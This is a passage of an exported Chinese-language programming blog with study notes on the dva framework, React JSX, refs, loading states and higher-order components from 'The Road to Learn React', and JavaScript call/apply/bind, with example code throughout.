新增这一行app.model(&#123; /**/&#125;);app.router( () =&gt; &lt;App/&gt;);app.start(&apos;#root&apos;); Model 对象的例子12345678910111213&#123; namespace: &apos;count&apos;, state: 0, reducers: &#123; add(state) &#123; return state + 1 &#125;, &#125;, effects: &#123; *addAfter1Second(action, &#123; call,put &#125;) &#123; yield call(delay,1000); yield put(&#123; type: &apos;add&apos;&#125;); &#125; &#125;&#125; Model 对象的属性namespace: 当前 Model 的名称，整个应用的 State ，由多个小的 Model 的 State 以 namespace 为 key 合成state: 该 Model 当前的状态。数据保存在这里，直接决定了视图层的输出reducers: Action 处理器，处理同步动作，用来算出最新的 stateeffects: Action 处理器，处理异步动作 ReducerReducer 是 Action 处理器，用来处理同步操作，可以看做是 state 的计算器，它的作用是根据 Action ，从上一个 State 算出当前的 State例子： 1234567891011121314// count + 1function add(state) &#123; return state + 1; &#125;//往 [] 里添加一个新的 todofunction addTodo(state, action)&#123; return [...state, action.payload]; &#125;//往 &#123; todos: [], loading: true &#125; 里添加一个新的 todo,并标记 loading 为 falsefunction addTodo(state, action)&#123; return &#123; ...state, todos: state.todos.concat(action.payload), loading: false &#125;&#125; EffectAction 处理器，处理异步动作，基于 Redux-sga 实现。 Effect 指的是副作用。根据函数式编程，计算以外的操作都属于 Effect ，典型的就是 I/O 操作，数据库读写 1234function *addAfter1Second(action. &#123; put, all&#125;) &#123; yield(delay, 1000); yield put(&#123; type: &apos;add&apos;&#125;);&#125; Generator 函数Effect 是一个 Generator 函数，内部使用 yield 关键字，标识每一步的操作 （无论同步或者是异步） call 和 putdva 提供多个 effect 函数内部的处理函数，比较常用的是 call 和 put 总例子12345678910111213141516171819202122232425262728293031app.model(&#123; namespace: &apos;count&apos;; state: &#123; record: 0, current: 0, &#125;, reducers: &#123; add(state) &#123; const newCurrent = state.current + 1; return &#123; ...state, record: newCurrent &gt; state.record ? newCurrent: state.record, current: newCurrent, &#125;; &#125;, minus(state) &#123; return &#123; ...state, current: state.current - 1&#125;; &#125;, &#125;, effects: &#123; *add(action ,&#123; call ,put&#125;)&#123; yield call( delay ,1000); yield put(&#123; type: &apos;minus&apos;&#125;); &#125;, &#125;, subscriptions: &#123; keyboardWatcher(&#123; dispatch &#125;) &#123; key( &apos;⌘+up, ctrl+up&apos;, () =&gt; &#123; dispatch(&#123; type:&apos;add&apos;&#125;)&#125;); &#125; &#125;&#125;)]]></content>
      <categories>
        <category>react相关</category>
      </categories>
      <tags>
        <tag>dva</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dva 学习笔记 (上)]]></title>
    <url>%2F2018-07-06-learn-dva-part1.html</url>
    <content type="text"><![CDATA[dva 学习笔记dva 学习笔记 代码 安装 dva-cli npm install dva-cli -g 创建新应用 dva new dva-quickstart 这会创建 dva-quickstart 目录，包含项目初始化目录和文件，并提供开发服务器，构建脚本，数据 mock 服务，代理服务器等功能 然后我们 cd 进入 dva-quickstart 目录，并启动开发服务器： cd dva-quickstartnpm start 使用 antd通过 npm 安装 antd 和 babel-plugin-import 。babel-plugin-import 是用来按需加载 antd 的脚本和样式的 npm install antd babel-plugin-import –save 编辑 .webpackrc，使 babel-plugin-import 插件生效。 12345&#123;+ "extraBabelPlugins": [+ ["import", &#123; "libraryName": "antd", "libraryDirectory": "es", "style": "css" &#125;]+ ]&#125; 定义路由们要写个应用来先显示产品列表。首先第一步是创建路由，路由可以想象成是组成应用的不同页面。 新建 route component routes / Products.js 添加路由信息到路由表，编辑 router.js Products.js 12import React from &apos;react&apos;;const Products = (props) =&gt; &lt;h2&gt;List of Products&lt;/h2&gt; export default Products; 1234567891011121314151617`router.js`import React from &apos;react&apos;;import &#123; Router, Route, Switch &#125; from &apos;dva/router&apos;;import IndexPage from &apos;./routes/IndexPage&apos;;import Products from &apos;./routes/Products&apos;;function RouterConfig(&#123; history &#125;) &#123; return ( &lt;Router history=&#123;history&#125;&gt; &lt;Switch&gt; &lt;Route path=&quot;/&quot; exact component=&#123;IndexPage&#125; /&gt; &lt;Route path=&quot;/products&quot; exact component=&#123;Products&#125; /&gt; &lt;/Switch&gt; &lt;/Router&gt; );&#125;export default RouterConfig; 编写 UI Component随着应用的发展，你会需要在多个页面分享 UI 元素 (或在一个页面使用多次)，在 dva 里你可以把这部分抽成 component 。 我们来编写一个 ProductList component，这样就能在不同的地方显示产品列表了。 新建 components/ProductList.js 文件： 1234567891011121314151617181920212223242526272829303132import React from &apos;react&apos;;import PropTypes from &apos;prop-types&apos;;import &#123; Table, Popconfirm, Button &#125; from &apos;antd&apos;;const ProductList = (&#123; onDelete, products &#125;) =&gt; &#123; const columns = [&#123; title: &apos;Name&apos;, dataIndex: &apos;name&apos;, &#125;, &#123; title: &apos;Actions&apos;, render: (text, record) =&gt; &#123; return ( &lt;Popconfirm title=&quot;Delete?&quot; onConfirm=&#123;() =&gt; onDelete(record.id)&#125;&gt; &lt;Button&gt;Delete&lt;/Button&gt; &lt;/Popconfirm&gt; ); &#125;, &#125;]; return ( &lt;Table dataSource=&#123;products&#125; columns=&#123;columns&#125; /&gt; );&#125;;ProductList.propTypes = &#123; onDelete: PropTypes.func.isRequired, products: PropTypes.array.isRequired,&#125;;export default ProductList; 定义 Model完成 UI 后，现在开始处理数据和逻辑。 dva 通过 model 的概念把一个领域的模型管理起来，包含同步更新 state 的 reducers，处理异步逻辑的 effects，订阅数据源的 subscriptions 。 新建 model models/products.js ： 123456789export default &#123; namespace: &apos;products&apos;, state: [], reducers: &#123; &apos;delete&apos;(state, &#123; payload: id &#125;) &#123; return state.filter(item =&gt; item.id !== id); &#125;, &#125;,&#125;; 这个 model 里： namespace 表示在全局 state 上的 keystate 是初始值，在这里是空数组reducers 等同于 redux 里的 reducer 接收 action，同步更新 state然后别忘记在 index.js 里载入他： connect 起来这里，我们已经单独完成了 model 和 component，那么他们如何串联起来呢? dva 提供了 connect 方法。如果你熟悉 redux，这个 connect 就是 react-redux 的 connect 。 编辑 routes/Products.js，替换为以下内容： 1234567891011121314151617181920212223import React from &apos;react&apos;;import &#123; connect &#125; from &apos;dva&apos;;import ProductList from &apos;../components/ProductList&apos;;const Products = (&#123; dispatch, products &#125;) =&gt; &#123; function handleDelete(id) &#123; dispatch(&#123; type: &apos;products/delete&apos;, payload: id, &#125;); &#125; return ( &lt;div&gt; &lt;h2&gt;List of Products&lt;/h2&gt; &lt;ProductList onDelete=&#123;handleDelete&#125; products=&#123;products&#125; /&gt; &lt;/div&gt; );&#125;;// export default Products;export default connect((&#123; products &#125;) =&gt; (&#123; products,&#125;))(Products); 最后，我们还需要一些初始数据让这个应用 run 起来。编辑 index.js： 123456789- const app = dva();+ const app = dva(&#123;+ initialState: &#123;+ products: [+ &#123; name: &apos;dva&apos;, id: 1 &#125;,+ &#123; name: &apos;antd&apos;, id: 2 &#125;,+ ],+ &#125;,+ &#125;); Dva 概念数据的改变发生通常是通过用户交互行为或者浏览器行为（如路由跳转等）触发的，当此类行为会改变数据的时候可以通过 dispath 发起一个 action ，如果是同步行为就会直接通过 Reducers 改变 state ,如果是异步行为（副作用）会先触发 Effects 然后流向 Reducers 最终改变 State ，所以在 dva 中，数据流向非常清晰简明，并且思路基本跟开源社区保持一致 ModelsState type State = any State 表示 Model 的状态数据，通常表现为一个 javascript 对象（可以为任何值），操作的时候每次都要当作不可变数据来对待，保证每次都是全新对象，没有引用关系，这样才能保证 State 的独立性，便于测试和追踪变化 在 dva 中可以通过 dva 的实例属性 _store 看到顶部的 state 数据，但是通常会很少用到 const app = dva();console.log(app._store); // 顶部的 state 数据 Action type AsyncAction = any Action 是一个普通 javascript 对象，它是改变 State 的唯一途径。无论是从 UI 事件、网络回调还是 WebSocket 等数据源获得的数据，最终都会通过 dispatch 函数调用一个 action,从而改变对应的数据。 action 必须带有 type 属性指明具体的行为，其他字段可以自定义，如果要发起一个 action 需要使用 dispatch 函数，需要注意的是 dispatch 是在组件 connect Models 后，通过 props 传入的 dispatch({ type : ‘add’ }) dispatch 函数 type dispatch = (a : Action) =&gt; Action dispatching function 是一个用于触发 action 的函数， action 是改变 State 的唯一途径，但是它只描述了一个行为，而 dispatch 可以看做是触发这个行为的方式，而 Reducer 则是描述如何改变数据的 在 dva 中。 connect Models 的组件通过 props 可以访问到 dispatch ，可以调用 Model 中的 Reducer 或者 Effect ，常见的形式如下 dispatch({ type : ‘user/add’, payload : {} //需要传递的信息 }) //如果在 model 外调用，需要添加 namespace Reducer type Reducer&lt;S, A&gt; = (state: S, action: A) =&gt; S Reducer 也称为 reducing function 函数接受两个参数：之前已经积累运算的结果和当前要被积累的值，返回的是一个新的积累的结果。该函数把一个集合归并成一个单值。 Reducer 的概念来自是函数式编程，很多语言中都有 reduce API 12345[&#123;x:1&#125;,&#123;y:2&#125;,&#123;z:3&#125;].reduce(function(prev, next)&#123; return Object.assign(prev, next);&#125;)//return &#123;x:1, y:2, z:3&#125; 在 dva 中， reducers 聚合积累的结果时间当前 model 的 state 对象。通过 actions 中传入的值，与当前 reducers 中的值进行运算获得新的值（也就是新的 state）。需要注意的是 Reducer 必须是纯函数，所以同样输入必然得到同样的输出，它们不应该产生任何副作用。并且， 每一次计算都应该使用 immutable date,这种特征简单理解就是每次操作都是返回一个全新的数据（独立、纯净），所以热重载和时间旅行这些功能才能够使用 EffectEffect 被称为副作用，在我们的应用中，最常见的就是异步操作，它来自于函数编程的概念，之所以叫副作用的原因是它使得我们的函数变得不纯，同样的输入不一定是同样的输出 dva 为了控制副作用的操作，底层引入了 redux-sagas 做异步流程控制，由于采用了 generator 的相关概念，所以将异步转成同步写法，从而将 effect 转为了纯函数。 SubscirptionSubscription 是一种从源获取数据的方法，它来自于 elm Subscription 语义是订阅，用于订阅一个数据源，然后根据条件 dispatch 需要的 action 。数据源可以当前的世界，服务器的 websocket 连接， keyboard 输入，geolocation 变化，history 路由变化等等 123456789import key from &apos;keymaster&apos;;app.model(&#123; namespace:&apos;count&apos;, subscriptions:&#123; keyEvent(&#123;dispatch&#125;)&#123; key(&apos;⌘+up, ctrl+up&apos;, () =&gt; &#123; dispatch(&#123;type:&apos;add&apos;&#125;) &#125;) &#125; &#125;&#125;) Router这里的路由是指前端路由，由于我们的应用通常是单页应用，所以需要前端代码来控制路由逻辑，通过浏览器提供的 History Api 可以监听到浏览器 url 的变化，从而控制路由相关操作 dva 实例提供了 router 方法来控制路由，使用的是 react-router 123456import &#123; Router, Route &#125; from &apos;dva/router&apos;;app.router( (&#123;history&#125;) =&gt; &lt;Router history = &#123;history&#125;&gt; &lt;Route path=&quot;/&quot; componet = &#123;HomePage&#125;&gt; &lt;/Router&gt; ); Router ComponentsContainer Components 在 dva 中我们通常将其约束为 Route Component ,因为在 dva 中是以也页面维度来设计 Components dva 中，通常需要 connect Model 的组件都是 Route Components,组织在 /routers/ 目录下，而 /compoents/ 目录下的则是纯组件]]></content>
      <categories>
        <category>react相关</category>
      </categories>
      <tags>
        <tag>dva</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React 高级指引 D1]]></title>
    <url>%2F2018-07-05-HIgherReact-day01.html</url>
    <content type="text"><![CDATA[React 高级指引学习笔记-第一天深入 JSX在本质上讲， JSX 只是为 React.createElement(component,props,...children) 方法提供的与语法糖 1&lt;MyButton color=&quot;blue&quot; shadowSize = &#123;2&#125;&gt; Click Me &lt;/MyButton&gt; 编译为： 1React.createElement( MyButton , &#123; color : &apos;blue&apos; , shadowSize : 2&#125; , &apos;Click Me&apos; ); 如果没有子代，可以用闭合标签 1&lt;div className = &apos;sidebar&apos; /&gt; 编译为： 1React.createElement( &apos;div&apos; , &#123; className : &apos;sidebar&apos; &#125; , null); 指定 React 元素类型JSX 的标签名决定了 React 元素的类型大写开头的 JSX 标签标示一个 React 组件，这些标签会被编译为同名变量并被引用，所以如果使用了 &lt;Foo/&gt; 表达式，就必须在作用域先声明 Foo 变量 React 必须声明由于 JSX 编译后会调用 React.createElement 方法，所以在 JSX 代码中必须首先声明 React 变量下面的导入都是必须的，尽管在代码中没有直接引用 12345import React from &apos;react&apos;;import CustomButton from &apos;./CustomButton&apos;;function WarningButton()&#123; return &lt;CustomButton color = &quot;red&quot;&gt;&#125; 如果使用 &lt;script&gt; 加载 React ，将作用于全局 点表示法使用 JSX 中的点来引用 React 组件，可以方便地从一个模块中导出许多 React 组件 12345678910import React from &apos;react&apos;;const MyComponents = &#123; DatePicker : function DatePicker(props)&#123; return &lt;div&gt; Imagine a &#123; props.color &#125; datepicker here.&lt;/div&gt; &#125;&#125;function BlueDatePicker()&#123; return &lt;MyCompoents.DatePicker color = &quot;blue&quot;&gt;&#125; 首字母大写当元素类型以小写字母开头时，它表示一个内置组件，如 &lt;div&gt; 或 &lt;span&gt;,并将字符串 &#39;div&#39; 或 &#39;span&#39; 传递给 React.createElement 。以大写字母开头的类型，如 &lt;Foo /&gt; 编译为 React.createElement(Foo) ，并它正对应与在 JavaScript 文件中定义或导入的组件 例如，下面的代码将无法按预期运行： 123456789101112import React from &apos;react&apos;;// 错误！组件名应该首字母大写:function hello(props) &#123; // 正确！div 是有效的 HTML 标签: return &lt;div&gt;Hello &#123;props.toWhat&#125;&lt;/div&gt;;&#125;function HelloWorld() &#123; // 错误！React 会将小写开头的标签名认为是 HTML 原生标签: return &lt;hello toWhat=&quot;World&quot; /&gt;;&#125; 为了解决这个问题，我们将 hello 重命名为 Hello，然后使用 &lt;Hello /&gt; 引用： 123456789101112import React from &apos;react&apos;;// 正确！组件名应该首字母大写:function Hello(props) &#123; // 正确！div 是有效的 HTML 标签: return &lt;div&gt;Hello &#123;props.toWhat&#125;&lt;/div&gt;;&#125;function HelloWorld() &#123; // 正确！React 能够将大写开头的标签名认为是 React 组件。 return &lt;Hello toWhat=&quot;World&quot; /&gt;;&#125; 在运行时选择类型你不能使用表达式来作为 React 元素的标签。如果你的确想通过表达式来确定 React 元素的类型，请先将其赋值给大写开头的变量。这种情况一般会在你想通过属性值条件渲染组件时出现： 123456789101112import React from &apos;react&apos;;import &#123; PhotoStory, VideoStory &#125; from &apos;./stories&apos;;const components = &#123; photo: PhotoStory, video: VideoStory&#125;;function Story(props) &#123; // 错误！JSX 标签名不能为一个表达式。 return &lt;components[props.storyType] story=&#123;props.story&#125; /&gt;;&#125; 要解决这个问题，我们需要先将类型赋值给大写开头的变量。 12345678910111213import React from &apos;react&apos;;import &#123; PhotoStory, VideoStory &#125; from &apos;./stories&apos;;const components = &#123; photo: PhotoStory, video: VideoStory&#125;;function Story(props) &#123; // 正确！JSX 标签名可以为大写开头的变量。 const SpecificStory = components[props.storyType]; return &lt;SpecificStory story=&#123;props.story&#125; /&gt;;&#125; 属性在 JSX 中有几种不同的方式来指定属性 使用 JavaScript 表示式可以传递任何 {} 包裹的 JavaScript 表示式作为一个属性值 1&lt;MyComponent foo = &#123; 1 + 2 + 3 + 4 &#125;&gt; if 语句和 for 循环在 JavaScript 中不是表达式，因此它们不能直接在 JSX 中使用，但是可以把它们放在周围的代码中 123456789function NumberDescriber(props)&#123; let description; if(props.number % 2 == 0)&#123; description = &lt;strong&gt;even&lt;/strong&gt; &#125; else&#123; description = &lt;i&gt;odd&lt;/i&gt; &#125; return &lt;div&gt;&#123;props.number&#125; is an &#123;description&#125; number &lt;/div&gt;&#125; 字符串常量可以将字符串常量作为属性值传递，下面的 JSX 是等价的 12&lt;MyCompoent message = &apos;hello world&apos; /&gt; &lt;MyConmpoent message = &#123; &apos;hello world&apos; &#125;&gt; 当传递一个字符串常量时，该值会被解析为 HTML 非转义字符串，所以下面的 JSX 表达式时相同的 12&lt;MyCompoent message = &apos;3&apos; /&gt; &lt;MyConmpoent message = &#123; &apos;&lt;3&apos; &#125;&gt; 默认为 True如果没有给属性值，它默认有属性传值，默认为 true 12&lt;MyCompoent autocomplete /&gt; &lt;MyConmpoent autocomplete = &#123; true &#125;&gt; 一般情况下，不建议这么使用，因为它hi与 ES6对象简洁表示法混淆。比如 {foo} 是 {foo: foo} 的简写，而不是 {foo: true}。这里能这样用，是因为它符合 HTML 的做法。 扩展属性如果已经有 props 属性，并且想在 JSX 中传递它，可以使用 ... 作为扩展操作符来传递整个属性对象 12345678function App1()&#123; return &lt;Greeting firstName = &quot;Ben&quot; lastName = &quot;Hector&quot; /&gt;;&#125;function App2()&#123; const props = &#123; firstName : &apos;Ben&apos; , lastName : &apos;Hector&apos; &#125;; return &lt;Greeting &#123;...props&#125; /&gt;&#125; 当构造通用容器时，扩展属性会非常有用，然而这样做也有可能让很多不相关的属性，传递到不需要它们的组件中使得代码非常混乱，谨慎这个用法 子代在包含开始和结束标签的 JSX 表达式中，标记之间的内容作为特殊的参数传递 ： props.children ，有几种不同的方法来传递子代 字符串常量-可以在开始和结束标签之间放入一个字符串，则 props.children 就是那个字符串，对于很多内置 HTML 元素很有用 1&lt;MyComponent&gt; Hello World! &lt;/MyComponent&gt; 这是有效的 JSX ，并且 MyComponent 的 props.children 值将会直接是 hello world! 因为 HTML 未转义，所以可以像 HTML 一样写 JSX 1&lt;div&gt; This is valid HTML \ JSX at the same time &lt;/div&gt; JSX 会移除空行和开始与结尾处的空格。标签邻近的新行也会被移除，字符串常量内部的换行会被压缩成一个空格，所以下面这些都等价： 123456789101112131415&lt;div&gt;Hello World&lt;/div&gt;&lt;div&gt; Hello World&lt;/div&gt;&lt;div&gt; Hello World&lt;/div&gt;&lt;div&gt; Hello World&lt;/div&gt; JSX可以通过子代嵌入更多的 JSX 元素，这对于嵌套显示组件非常有用： 1234&lt;MyContainer&gt; &lt;MyFirstComponent /&gt; &lt;MySecondComponent /&gt;&lt;/MyContainer&gt; 你可以混合不同类型的子元素，同时用字符串常量和 JSX 子元素，这是 JSX 类似 HTML 的另一种形式，这在 JSX 和 HTML 中都是有效的： 1234567&lt;div&gt; Here is a list: &lt;ul&gt; &lt;li&gt;Item 1&lt;/li&gt; &lt;li&gt;Item 2&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; React 组件也可以通过数组的形式返回多个元素： 123456789render() &#123; // 不需要使用额外的元素包裹数组中的元素 return [ // 不要忘记 key :) &lt;li key=&quot;A&quot;&gt;First item&lt;/li&gt;, &lt;li key=&quot;B&quot;&gt;Second item&lt;/li&gt;, &lt;li key=&quot;C&quot;&gt;Third item&lt;/li&gt;, ];&#125; JavaScript 表达式可以将任何 {} 包裹的 JavaScript 表达式作为子代传递。例如，下面这些表达式是等价的： \foo\\{‘foo’}\ 这对于渲染任意长度的 JSX 表达式的列表很有用。例如，下面将会渲染一个 HTML 列表： 123456789function Item(props)&#123; return &lt;li&gt;&#123; props.message &#125;&lt;/li&gt;&#125;function TodoList()&#123; const todos = [&apos;finish doc&apos; , &apos;submit pr&apos; , &apos;nag dan to review&apos;]; return( &lt;ul&gt; &#123;todos.map( (message) =&gt; &lt;Item message = &#123; message &#125; key = &#123; message &#125;&gt; )&#125; &lt;/ul&gt; )&#125; JavaScript 表达式可以与其他类型的子代混合使用，这通常对于字符串模板非常有用 123function Hello(props)&#123; return &lt;div&gt; Hello &#123; props.address &#125; !&lt;/div&gt;&#125; 函数通常情况下，插入 JSX 中的 JavaScript 表达式认作字符串, React 或这些内容的列表。然而， props.children 可以像其他属性一样传递任何数据，而不仅仅是 React 元素。例如，如果你使用自定义组件，则可以将调用 props.children 来获得传递的子代 123456789101112131415function Repeat(props)&#123; let items = []; for(let i = 0; i &lt; props.numTimes; i++)&#123; item.push( props.children(i) ); &#125; return &lt;div&gt;&#123; item &#125;&lt;/div&gt;&#125;function ListOfTenThings()&#123; return( &lt;Repeat numTimes = &#123;10&#125;&gt; &#123; (index) =&gt; &lt;div key =&#123;index&#125;&gt;This is item &#123;index&#125; in the list &lt;/div&gt; &#125; &lt;/Repeat&gt; )&#125; 传递给自定义组件的子代可以是任何的元素，只要该组件在 React 渲染钱将其转换成 React 能够理解的东西，这个用法并不常见，但是当你想扩展 JSX 时可以使用 布尔值 、 Null 和 Undefined 被忽略false 、 null 、 undefined 和 true 都是有效的子代，但它们不会直接被渲染。下面的表达式是等价的： 1234567891011&lt;div /&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&#123;false&#125;&lt;/div&gt;&lt;div&gt;&#123;null&#125;&lt;/div&gt;&lt;div&gt;&#123;undefined&#125;&lt;/div&gt;&lt;div&gt;&#123;true&#125;&lt;/div&gt; 这在根据条件来确定是否渲染 React 元素时非常有用。以下的 JSX 只会在 showHeader 为 true 时渲染 &lt;Header /&gt; 组件。 1234&lt;div&gt; &#123;showHeader &amp;&amp; &lt;Header /&gt;&#125; &lt;Content /&gt;&lt;/div&gt; 值得注意的是，JavaScript 中的一些 “falsy” 值(比如数字0)，它们依然会被渲染。例如，下面的代码不会像你预期的那样运行，因为当 props.message 为空数组时，它会打印 0: 12345&lt;div&gt; &#123;props.messages.length &amp;&amp; &lt;MessageList messages=&#123;props.messages&#125; /&gt; &#125;&lt;/div&gt; 要解决这个问题，请确保 &amp;&amp; 前面的表达式始终为布尔值： 12345&lt;div&gt; &#123;props.messages.length &gt; 0 &amp;&amp; &lt;MessageList messages=&#123;props.messages&#125; /&gt; &#125;&lt;/div&gt; 相反，如果你想让类似 false 、true 、null 或 undefined 出现在输出中，你必须先把它转换成字符串 : 123&lt;div&gt; My JavaScript variable is &#123;String(myVariable)&#125;.&lt;/div&gt; 注解：JavaScript 中 falsy 值的例子 (将 falsy 值转换为 false ): 12345678if (false) if (null) if (undefined) if (0) if (NaN) if (&apos;&apos;) if (&quot;&quot;) if (document.all)]]></content>
      <categories>
        <category>react相关</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road to learn React Part4]]></title>
    <url>%2F2018-06-26-TheRoadtolearnReactPart4.html</url>
    <content type="text"><![CDATA[The Road to learn React书籍学习笔记(第四章) 高级React组件本章将重点介绍高级 React 组件的实现。我们将了解什么是高阶组件以及如何实现它们。此外，我们还将深入探讨 React 中更高级的主题，并用它实现复杂的交互功能。 引用 DOM 元素有时候我们需要在 React 与 DOM 节点进行交互。 ref 属性可以让我们访问元素中的一个节点，通常，访问 DOM 节点是 React 中的一个反模式，因为我们应该遵循它的声明式编程和单向数据流。当我们引入第一搜索组件时，就已经了解刀这些问题，但是在某些情况下，我们仍然要访问 DOM 节点。官方文档提到了三种情况使用 DOM API(focus事件，媒体播放等)调用命令式 DOM 节点动画与需要 DOM 节点的第三方库集成 让我们通过 Search 组件这个例子看一下。当应用程序第一次渲染时，input 字段应该被聚焦。这是需要访问 DOM API 的一种用例。本章将展示渲染时聚焦 input 字段是如何工作的，但由于这个功能对于应用程序并不是很有用，所以我们将在本章之后省略这些更改。尽管如此，你仍然可以为自己的应用程序保留它。 通常，无状态组件和 ES6 类组件中都可以使用 ref 属性。在聚焦 input 字段的用例中，我们就需要一个生命周期方法。这就是为什么接下来会先在 ES6 类组件中展示如何使用 ref 属性。 第一步是将无状态组件重构为 ES6 类组件。 1234567891011121314151617181920212223class Search extends Component &#123; render() &#123; const &#123; value, onChange, onSubmit, children &#125; = this.props; return ( &lt;form onSubmit=&#123;onSubmit&#125;&gt; &lt;input type=&quot;text&quot; value=&#123;value&#125; onChange=&#123;onChange&#125; /&gt; &lt;button type=&quot;submit&quot;&gt; &#123;children&#125; &lt;/button&gt; &lt;/form&gt; ); &#125;&#125; ES6 类组件的this对象可以帮助我们通过 ref 属性引用 DOM 节点。 123456789101112131415161718192021222324class Search extends Component &#123; render() &#123; const &#123; value, onChange, onSubmit, children &#125; = this.props; return ( &lt;form onSubmit=&#123;onSubmit&#125;&gt; &lt;input type=&quot;text&quot; value=&#123;value&#125; onChange=&#123;onChange&#125; ref=&#123;(node) =&gt; &#123; this.input = node; &#125;&#125; /&gt; &lt;button type=&quot;submit&quot;&gt; &#123;children&#125; &lt;/button&gt; &lt;/form&gt; ); &#125;&#125; 现在，你可以通过使用 this 对象、适当的生命周期方法和 DOM API 在组件挂载的时候来聚焦 input 字段 123456789101112131415161718192021222324252627282930lass Search extends Component &#123; componentDidMount() &#123; if(this.input) &#123; this.input.focus(); &#125; &#125; render() &#123; const &#123; value, onChange, onSubmit, children &#125; = this.props; return ( &lt;form onSubmit=&#123;onSubmit&#125;&gt; &lt;input type=&quot;text&quot; value=&#123;value&#125; onChange=&#123;onChange&#125; ref=&#123;(node) =&gt; &#123; this.input = node; &#125;&#125; /&gt; &lt;button type=&quot;submit&quot;&gt; &#123;children&#125; &lt;/button&gt; &lt;/form&gt; ); &#125;&#125; 当应用程序渲染时，input 字段应该被聚焦。这就是ref属性的基本用法。 但是我们怎样在没有this对象的无状态组件中访问ref属性呢？接下来我们在无状态组件中演示。 123456789101112131415161718192021const Search = (&#123; value, onChange, onSubmit, children &#125;) =&gt; &#123; let input; return ( &lt;form onSubmit=&#123;onSubmit&#125;&gt; &lt;input type=&quot;text&quot; value=&#123;value&#125; onChange=&#123;onChange&#125; ref=&#123;(node) =&gt; input = node&#125; /&gt; &lt;button type=&quot;submit&quot;&gt; &#123;children&#125; &lt;/button&gt; &lt;/form&gt; );&#125; 加载现在让我们回到应用程序。当向 Hacker News API 发起搜索请求时，我们想要显示一个加载指示符。 请求是异步的，此时应该向用户展示某些事情即将发生的某种反馈。让我们在 src／App.js 中定义一个可重用的 Loading 组件。 const Loading = () =&gt;\Loading …\ 现在你将需要一个属性来存储加载状态。根据加载状态可以决定稍后是否显示所加载的组件。 src/App.js 123456789101112131415161718class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; results: null, searchKey: &apos;&apos;, searchTerm: DEFAULT_QUERY, error: null, isLoading: false, &#125;; ...&#125;...&#125; isLoading 的初始值是 false。在 App 组件挂载完成之前，无需加载任何东西。 当发起请求时，将加载状态 (isLoading) 设置为 true。最终，请求会成功，那时可以将加载状态 (isLoading) 设置为 false。 src/App.js 1234567891011121314151617181920212223242526272829class App extends Component &#123;...setSearchTopStories(result) &#123; ... this.setState(&#123; results: &#123; ...results, [searchKey]: &#123; hits: updatedHits, page &#125; &#125;, isLoading: false &#125;); &#125; fetchSearchTopStories(searchTerm, page = 0) &#123; this.setState(&#123; isLoading: true &#125;); fetch(`$&#123;PATH_BASE&#125;$&#123;PATH_SEARCH&#125;?$&#123;PARAM_SEARCH&#125;$&#123;searchTerm&#125;&amp;$&#123;PARAM_PAGE&#125;\ $&#123;page&#125;&amp;$&#123;PARAM_HPP&#125;$&#123;DEFAULT_HPP&#125;`) .then(response =&gt; response.json()) .then(result =&gt; this.setSearchTopStories(result)) .catch(e =&gt; this.setState(&#123; error: e &#125;)); &#125; ...&#125; 最后一步，我们将在应用程序中使用 Loading 组件。基于加载状态 (isLoading) 的条件来决定渲染 Loading 组件或 Button 组件。后者为一个用于获取更多数据的按钮。 src/App.js 12345678910111213141516171819202122232425262728293031class App extends Component &#123; ... render() &#123; const &#123; searchTerm, results, searchKey, error, isLoading &#125; = this.state; ... return ( &lt;div className=&quot;page&quot;&gt; ... &lt;div className=&quot;interactions&quot;&gt; &#123; isLoading ? &lt;Loading /&gt; : &lt;Button onClick=&#123;() =&gt; this.fetchSearchTopStories(searchKey, page + 1)&#125;&gt; More &lt;/Button&gt; &#125; &lt;/div&gt; &lt;/div&gt; ); &#125;&#125; 由于我们在componentDidMount（）中发起请求，Loading 组件会在应用程序启动的时候显示。此时，因为列表是空的，所以不显示 Table 组件。当响应数据从 Hacker News API 返回时，返回的数据会通过 Table 组件显示出来，加载状态 (isLoading) 设置为 false，然后 Loading 组件消失。同时，出现了可以获取更多的数据的“More”按钮。一旦点击按钮，获取更多的数据，该按钮将消失，加载组件会重新出现。 高阶组件高阶组件（HOC）是 React 中的一个高级概念。HOC 与高阶函数是等价的。它接受任何输入 - 多数时候是一个组件，也可以是可选参数 - 并返回一个组件作为输出。返回的组件是输入组件的增强版本，并且可以在JSX中使用。 HOC可用于不同的情况，比如：准备属性，管理状态或更改组件的表示形式。其中一种情况是将 HOC 用于帮助实现条件渲染。想象一下现在有一个 List 组件，由于列表可以为空或无，那么它可以渲染一个列表或者什么也不渲染。当没有列表的时候，HOC 可以屏蔽掉这个不显示任何内容的列表。另一方面，这个简单的 List 组件不再需要关心列表存不存在，它只关心渲染列表。 高级排序我们已经实现了客户端和服务器端搜索交互。因为我们已经拥了 Table 组件，所以增强 Table 组件的交互性是有意义的。那接下来，我们为 Table 组件加入根据列标题进行排序的功能如何？ 你自己写一个排序函数，但是一般这种情况，我个人更喜欢使用第三方工具库。lodash就是这些工具库之一，当然你也可以选择适用于你的任何第三方库。让我们安装 lodash 并使用。 参考链接：https://leanpub.com/the-road-to-learn-react-chinese]]></content>
      <categories>
        <category>react相关</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[call/apply/bind 的区别]]></title>
    <url>%2F2018-06-23-call-apply-bind.html</url>
    <content type="text"><![CDATA[为什么需要使用 call/apply/bind举个栗子： 123456box.onclick = function()&#123; function fn()&#123; alert(this); &#125; fn();&#125; 上例中的 this 指向是 window，而不是 box 解决方法： 1234567box.onclick = function()&#123; var self = this; function fn()&#123; alert(self); &#125; fn();&#125; 通过把 this 定义给变量 self 将其保存下来，有时候我们想让伪数组也能够调用数组的一些方法，这时候 call/apply/bind 就派上用场了 123456box.onclick = function()&#123; function fn()&#123; console.log(this); &#125; fn.call(this);&#125; call 的作用就是改变 this 的指向，第一个传的就是一个对象，就是我们要借用的对象。 fn.call(this) 就是让 this 去调用 fn()，这里的 this 就是 box 上述例子可以进行简写：简写1 12345box.onclick = function()&#123; var fn = function()&#123; console.log(this); //box &#125;.call(this);&#125; 简写2 12345box.onclick = function()&#123; (function()&#123; console.log(this); //box &#125;.call(this));&#125; 另一种形式 12345678var objName = &#123;name:'lbh'&#125;;var obj = &#123; name:'hello', 